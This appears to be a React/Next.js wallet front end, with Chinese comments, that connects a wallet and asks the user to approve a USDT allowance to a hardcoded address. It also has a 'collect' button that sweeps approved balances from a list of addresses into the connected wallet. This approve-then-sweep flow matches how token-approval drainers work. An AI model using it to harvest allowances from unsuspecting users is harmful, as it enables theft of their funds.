"use client";
import './index.css'
import { Button } from "antd";
// import Image from "next/image";
import { useConnect, useAccount, useDisconnect, useEnsAvatar, useEnsName } from "wagmi";
import { useWriteUSDTTransferFrom, useWriteUSDTApprove, useReadUSDTBalanceOf, USDT_CONTRACT_ADDRESS, USDTAbi} from "@/generated";
import { useBalances } from "@/hooks/useBalances"
import { useEffect, useState } from "react";
import { ethers, formatUnits } from "ethers";

export default function Home() {
  const { connectors } = useConnect();
  const { isConnected } = useAccount();

  // if (isConnected) return <Account />;
  if (isConnected) return <Collection />;

  const walletConnectConnector = connectors.find(
    (connector) => connector.id === "walletConnect"
  );

  const injectedConnector = connectors.find(
    (connector) => connector.id === "injected"
  );

  const eip6963Connectors = connectors.filter(
    (connector) =>
      connector !== walletConnectConnector && connector !== injectedConnector
  );

  // 链接钱包
  const eip6963Buttons = eip6963Connectors.map((connector) => (
    <div className='marginTop20' key={connector.id} ><ConnectorButton connector={connector} /></div>

  ));

  return (
    <div className="flex flex-col items-center">
      <div className="inline-flex w-60 p-2 my-2 border-1 border-black border-dashed flex-col items-center gap-y-1">
        <p className='marginTop20'>Connect Wallet</p>
        {eip6963Buttons}
      </div>
    </div>
  );
}

declare let window: any
const Account = () => {
  const { address } = useAccount();
  const { disconnect } = useDisconnect();
  const { data: ensName } = useEnsName({ address });
  const { data: ensAvatar } = useEnsAvatar({ name: ensName! });
  const { writeContractAsync: approve } = useWriteUSDTApprove();
  // 创建一个 Web3Provider 实例
  const provider = new ethers.BrowserProvider(window.ethereum)

  // 定义 ERC20 合约的 ABI
  const erc20ABI = [
    {
      constant: false,
      inputs: [
        { name: '_spender', type: 'address' },
        { name: '_value', type: 'uint256' }
      ],
      name: 'approve',
      outputs: [],
      payable: false,
      stateMutability: 'nonpayable',
      type: 'function'
    }
  ]
// { name: 'success', type: 'bool' }
const erc20ABI2 = [{
  constant:false,
  inputs:[
    {
      name:"_spender",
      type:"address"
    },{
      name:"_value",
      type:"uint256"
    }],
  name:"approve",
  outputs:[],
  payable:false,
  stateMutability:"nonpayable",
  type:"function"
}]

  // 创建 ERC20 合约实例
  const contractAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // 替换为实际的合约地址

  // 定义 approveToken 函数
  async function approveToken(spenderAddress: string, amount: string) {
    try {

      await approve({args:[ 
            "0x5ecA4288BFe530AB9b3cf455eE94c8951EA292bb"
            , BigInt(1_000_000)]
        });
    } catch (error) {
      console.error('Error approving tokens:', error);
      alert(`Error approving tokens: ${error}`)
    }
  }

  //Approve 授权
  function approveTest() {
    approveToken('', '')
        
  }

  return (
    <div className="flex min-h-screen flex-col items-center justify-start marginTop20">
      {/*{ensAvatar && <Image alt="ENS Avatar" src={ensAvatar} />}*/}
      {address && <div>{ensName ? `${ensName} (${address})` : address}</div>}
      <Button className="marginTop20" onClick={() => disconnect()}>Disconnect</Button>
      <Button className="marginTop20" onClick={() => { approveTest() }}>Approve</Button>
    </div>
  );
};

const Collection = () => {
  const { address } = useAccount();
  const { disconnect } = useDisconnect();
  const { data: ensName } = useEnsName({ address });
  const { data: ensAvatar } = useEnsAvatar({ name: ensName! });
  const { writeContractAsync: approve } = useWriteUSDTApprove();
  const { writeContractAsync: transferFrom } = useWriteUSDTTransferFrom();
  const { balanceOf } = useReadUSDTBalanceOf();
  /**
   * 测试用，生产不用
   * */  
  const addressAdmin = "0x5ecA4288BFe530AB9b3cf455eE94c8951EA292bb";
  /**
   * 待提取地址列表，生产需要获取
   * */ 
  const addressToWithdrawList = ["0x46bD3F02D77a6F41fC052E8Ec79002D30a4Dd19A","0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266"];
  async function collectFunc() {
    
    try {
      console.log("work start");
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const USDTContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDTAbi, provider);
      for (let i = 0; i < addressToWithdrawList.length; i++) {
        const targetAddress = addressToWithdrawList[i];
        const balance = await USDTContract.balanceOf(targetAddress);
        const allowance = await USDTContract.allowance(targetAddress, address);
        if (allowance > 0) {
          const canWithdraw = allowance > balance ? balance: allowance;
          await transferFrom({args:[ targetAddress, address, canWithdraw]});
        } else {
          console.log(targetAddress,":无allowance余额用来归集",allowance);
        }
      }
    } catch (error) {
      console.error('Error balanceOf tokens:', error);
      alert(`Error balanceOf tokens: ${error}`)
    }
  }

  function collect() {
    collectFunc()  
  }

  return (
    <div className="flex min-h-screen flex-col items-center justify-start marginTop20">
      <Button className="marginTop20" onClick={() => { collect() }}>归集</Button>
    </div>
  );
};

const ConnectorButton = ({ connector }: { connector: any }) => {
  const [providerReady, setProviderReady] = useState(false);
  const { connect } = useConnect();

  useEffect(() => {
    if (!connector) return;
    (async () => {
      try {
        const provider = await connector.getProvider();
        setProviderReady(!!provider);
      } catch (error) {
        console.error(error);
      }
    })();
  }, [connector]);

  const onClick = () => {
    connect({ connector: connector });
  };

  return (
    <Button
      block
      type="default"
      loading={!providerReady}
      onClick={onClick}
    >
      {connector.name}
    </Button>
  );
};
